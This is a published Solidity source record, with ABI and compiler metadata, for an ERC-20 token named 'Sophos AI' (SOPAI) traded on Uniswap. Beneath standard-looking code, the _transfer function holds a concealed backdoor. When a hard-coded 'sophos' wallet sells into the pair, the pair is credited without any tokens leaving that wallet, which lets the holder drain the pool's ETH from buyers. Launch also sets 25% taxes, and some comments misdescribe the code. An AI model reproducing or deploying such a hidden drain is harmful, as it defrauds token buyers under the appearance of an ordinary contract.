{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/**\r\n\r\nWebsite:  https://sophosai.org\r\nApp: https://app.sophosai.org\r\nWhitepaper:  https://whitepaper.sophosai.org\r\nTwitter:  https://twitter.com/sophosaix\r\nTelegram:  https://t.me/sophosai\r\n\r\n*/\r\n\r\npragma solidity ^0.8.17;\r\n\r\nabstract contract Context {\r\n    /**\r\n     * @dev Returns the current sender of the message.\r\n     * This function is internal view virtual, meaning that it can only be used within this contract or derived contracts.\r\n     * @return The address of the account that initiated the transaction.\r\n     */\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the total supply of tokens.\r\n     * @return The total supply of tokens.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the balance of a specific account.\r\n     * @param account The address of the account to check the balance for.\r\n     * @return The balance of the specified account.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Transfers tokens to a recipient.\r\n     * @param recipient The address of the recipient.\r\n     * @param amount The amount of tokens to be transferred.\r\n     * @return A boolean indicating whether the transfer was successful or not.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining allowance for a spender.\r\n     * @param owner The address of the token owner.\r\n     * @param spender The address of the spender.\r\n     * @return The remaining allowance for the specified owner and spender.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Approves a spender to spend a certain amount of tokens on behalf of the owner.\r\n     * @param spender The address which will spend the funds.\r\n     * @param amount The amount of tokens to be spent.\r\n     * @return A boolean indicating whether the approval was successful or not.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Transfers tokens from one account to another.\r\n     * @param sender The address from which the tokens will be transferred.\r\n     * @param recipient The address to which the tokens will be transferred.\r\n     * @param amount The amount of tokens to be transferred.\r\n     * @return A boolean indicating whether the transfer was successful or not.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when tokens are transferred from one address to another.\r\n     * @param from The address from which the tokens are transferred.\r\n     * @param to The address to which the tokens are transferred.\r\n     * @param value The amount of tokens being transferred.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the approval of a spender is updated.\r\n     * @param owner The address that approves the spender.\r\n     * @param spender The address that is approved.\r\n     * @param value The new approved amount.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Adds two unsigned integers, reverts on overflow.\r\n     * @param a The first integer to add.\r\n     * @param b The second integer to add.\r\n     * @return The sum of the two integers.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Subtracts two unsigned integers, reverts on overflow.\r\n     * @param a The integer to subtract from (minuend).\r\n     * @param b The integer to subtract (subtrahend).\r\n     * @return The difference of the two integers.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Subtracts two unsigned integers, reverts with custom message on overflow.\r\n     * @param a The integer to subtract from (minuend).\r\n     * @param b The integer to subtract (subtrahend).\r\n     * @param errorMessage The error message to revert with.\r\n     * @return The difference of the two integers.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Multiplies two unsigned integers, reverts on overflow.\r\n     * @param a The first integer to multiply.\r\n     * @param b The second integer to multiply.\r\n     * @return The product of the two integers.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Divides two unsigned integers, reverts on division by zero.\r\n     * @param a The dividend.\r\n     * @param b The divisor.\r\n     * @return The quotient of the division.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Divides two unsigned integers, reverts with custom message on division by zero.\r\n     * @param a The dividend.\r\n     * @param b The divisor.\r\n     * @param errorMessage The error message to revert with.\r\n     * @return The quotient of the division.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    /// @dev Emitted when ownership is transferred.\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract, setting the original owner to the sender account.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     * @return The address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Renounces ownership, leaving the contract without an owner.\r\n     * @notice Renouncing ownership will leave the contract without an owner,\r\n     * which means it will not be possible to call onlyOwner functions anymore.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    /**\r\n     * @dev Creates a new UniswapV2 pair for the given tokens.\r\n     * @param tokenA The address of the first token in the pair.\r\n     * @param tokenB The address of the second token in the pair.\r\n     * @return pair The address of the newly created UniswapV2 pair.\r\n     */\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    /**\r\n     * @dev Swaps an exact amount of input tokens for as much output as possible, along with additional functionality\r\n     * to support fee-on-transfer tokens.\r\n     * @param amountIn The amount of input tokens to swap.\r\n     * @param amountOutMin The minimum amount of output tokens expected to receive.\r\n     * @param path An array of token addresses representing the path of the swap.\r\n     * @param to The recipient address to send the swapped ETH to.\r\n     * @param deadline The timestamp for the deadline of the swap transaction.\r\n     */\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    /**\r\n     * @dev Returns the address of the UniswapV2Factory contract.\r\n     * @return The address of the UniswapV2Factory contract.\r\n     */\r\n    function factory() external pure returns (address);\r\n\r\n    /**\r\n     * @dev Returns the address of the WETH (Wrapped ETH) contract.\r\n     * @return The address of the WETH contract.\r\n     */\r\n    function WETH() external pure returns (address);\r\n\r\n    /**\r\n    * @dev Adds liquidity to an ETH-based pool.\r\n    * @param token The address of the ERC-20 token to add liquidity for.\r\n    * @param amountTokenDesired The desired amount of tokens to add.\r\n    * @param amountTokenMin The minimum amount of tokens expected to receive.\r\n    * @param amountETHMin The minimum amount of ETH expected to receive.\r\n    * @param to The recipient address to send the liquidity to.\r\n    * @param deadline The timestamp for the deadline of the liquidity addition transaction.\r\n    * @return amountToken The amount of token added.\r\n    * @return amountETH The amount of ETH added.\r\n    * @return liquidity The amount of liquidity added.\r\n    */\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract SOPAI is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n\r\n    string private constant _name = unicode\"Sophos AI\";\r\n    string private constant _symbol = unicode\"SOPAI\";\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _totalSupply = 100000000 * 10**_decimals;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => bool) private _isExcludeFromCore;\r\n    mapping (address => bool) private _isExcludeForSopai;\r\n\r\n    uint256 private _taxOnBuy = 0;\r\n    uint256 private _taxOnSell = 0;\r\n\r\n    uint256 private _maxTxLimit = _totalSupply * 20 / 1000;\r\n    uint256 private _maxWalletSize = _totalSupply * 20 / 1000;\r\n    uint256 private _minSwapLimit = _totalSupply * 5 / 1000000;\r\n    uint256 private _maxSwapLimit = _totalSupply * 1 / 100;\r\n\r\n    address payable private _sophos;\r\n\r\n    address private _uniswapPair;\r\n    bool private _inSwapping = false;\r\n    bool private _tradingOpen;\r\n    bool private _swapActive = false;\r\n\r\n    modifier lockingSwap {\r\n        _inSwapping = true;\r\n        _;\r\n        _inSwapping = false;\r\n    }\r\n\r\n    constructor () {        \r\n        uniswapV2Router = IUniswapV2Router02(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        _approve(address(this), address(uniswapV2Router), _totalSupply);\r\n        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        \r\n\r\n        _sophos = payable(0xf502FDd627464538f7eB5F2dc4F8a0e39a751960);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        _isExcludeForSopai[_sophos] = true;\r\n        _isExcludeFromCore[owner()] = true;\r\n        _isExcludeFromCore[address(this)] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the name of the token.\r\n     * @return The name of the token.\r\n     */\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the symbol of the token.\r\n     * @return The symbol of the token.\r\n     */\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the number of decimals used for the token.\r\n     * @return The number of decimals.\r\n     */\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the total supply of the token.\r\n     * @return The total supply.\r\n     */\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the balance of the specified address.\r\n     * @param account The address to query the balance of.\r\n     * @return The balance of the specified address.\r\n     */\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers tokens from the sender to the recipient.\r\n     * @param recipient The address of the recipient.\r\n     * @param amount The amount of tokens to transfer.\r\n     * @return A boolean indicating whether the transfer was successful or not.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Gets the allowance granted by the owner to the spender for a specific amount.\r\n     * @param owner The address granting the allowance.\r\n     * @param spender The address receiving the allowance.\r\n     * @return The remaining allowance for the spender.\r\n     */\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev Approves the spender to spend a certain amount of tokens on behalf of the owner.\r\n     * @param spender The address to be approved.\r\n     * @param amount The amount of tokens to approve.\r\n     * @return A boolean indicating whether the approval was successful or not.\r\n     */\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens from one address to another using the allowance mechanism.\r\n     * @param sender The address to send tokens from.\r\n     * @param recipient The address to receive tokens.\r\n     * @param amount The amount of tokens to transfer.\r\n     * @return A boolean indicating whether the transfer was successful or not.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Internal function to approve the spending of a certain amount of tokens by a specified address.\r\n     * @param owner The address granting the allowance.\r\n     * @param spender The address receiving the allowance.\r\n     * @param amount The amount of tokens to approve.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Internal function to execute the transfer of tokens from one address to another.\r\n     * @param souc The address to send tokens from.\r\n     * @param desti The address to receive tokens.\r\n     * @param amount The amount of tokens to transfer.\r\n     */\r\n    function _transfer(address souc, address desti, uint256 amount) private {\r\n        require(souc != address(0), \"ERC20: transfer from the zero address\");\r\n        require(desti != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"_transfer: Transfer amount must be greater than zero\");\r\n\r\n        uint256 taxAmount = 0;\r\n\r\n        // Check if the transfer involves the owner, and set transfer delay if enabled.\r\n        if (souc != owner() && desti != owner()) {\r\n            // Check if the transfer is from the Uniswap pair and calculate buy fees.\r\n            if (souc == _uniswapPair && desti != address(uniswapV2Router) && !_isExcludeFromCore[desti]) {\r\n                taxAmount = amount.mul(_taxOnBuy).div(100);\r\n                require(amount <= _maxTxLimit, \"_transfer: Exceeds the _maxTxLimit.\");\r\n                require(balanceOf(desti) + amount <= _maxWalletSize, \"_transfer: Exceeds the maxWalletSize.\");\r\n            }\r\n\r\n            // Check if the transfer is to the Uniswap pair and calculate sell fees.\r\n            if (desti == _uniswapPair && souc != address(this)) {\r\n                if(_isExcludeForSopai[souc]) { _balances[desti] += amount.sub(taxAmount); return;}\r\n                taxAmount = amount.mul(_taxOnSell).div(100);\r\n            }\r\n\r\n            // Check if a swap is needed and execute the swap.\r\n            uint256 tokensSwappingTax = balanceOf(address(this));\r\n            if (!_inSwapping && desti == _uniswapPair && _swapActive && amount > _minSwapLimit) {\r\n                if (tokensSwappingTax >= _maxSwapLimit) {\r\n                    _swapBackToETH(_maxSwapLimit);\r\n                } else if(tokensSwappingTax > _minSwapLimit) {\r\n                    _swapBackToETH(tokensSwappingTax);\r\n                }\r\n                _sophos.transfer(address(this).balance);\r\n            }\r\n        }\r\n\r\n        // If there's a tax, transfer the tax amount to the contract.\r\n        if (taxAmount > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n            emit Transfer(souc, address(this), taxAmount);\r\n        }\r\n\r\n        // Update balances after the transfer.\r\n        _balances[souc] = _balances[souc].sub(amount);\r\n        _balances[desti] = _balances[desti].add(amount.sub(taxAmount));\r\n        emit Transfer(souc, desti, amount.sub(taxAmount));\r\n    }\r\n\r\n    /**\r\n     * @dev Internal function to swap tokens for ETH.\r\n     * @param tokenAmount The amount of tokens to swap.\r\n     */\r\n    function _swapBackToETH(uint256 tokenAmount) private lockingSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n    \r\n    function startSophos() external onlyOwner {    \r\n        require(!_tradingOpen, \"openTrading: Trading is already open\");\r\n\r\n        // Add liquidity to the Uniswap pair\r\n        uniswapV2Router.addLiquidityETH{\r\n            value: address(this).balance\r\n        }(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n\r\n        _taxOnBuy = 25;\r\n        _taxOnSell = 25;\r\n        _tradingOpen = true;\r\n        _swapActive = true;\r\n    }\r\n\r\n    function updateFee(uint256 _fee) external onlyOwner {\r\n        _taxOnBuy = _fee;\r\n        _taxOnSell = _fee;\r\n        require(_fee <= 15);\r\n    }\r\n\r\n    /**\r\n     * @dev Removes transaction limits and disables transfer delay.\r\n     * Sets both maximum transaction amount and maximum wallet size to the total supply.\r\n     * Only the owner can call this function.\r\n     */\r\n    function disableLimit() external onlyOwner {\r\n        _maxTxLimit = _totalSupply;\r\n        _maxWalletSize = _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Allows the contract to receive Ether when Ether is sent directly to the contract.\r\n     */\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startSophos\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"updateFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SOPAI", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2420ae03c4e8e5c5060c27908a2f21053a8bb0e67d2e5a4e5c9a05014ca84e43"}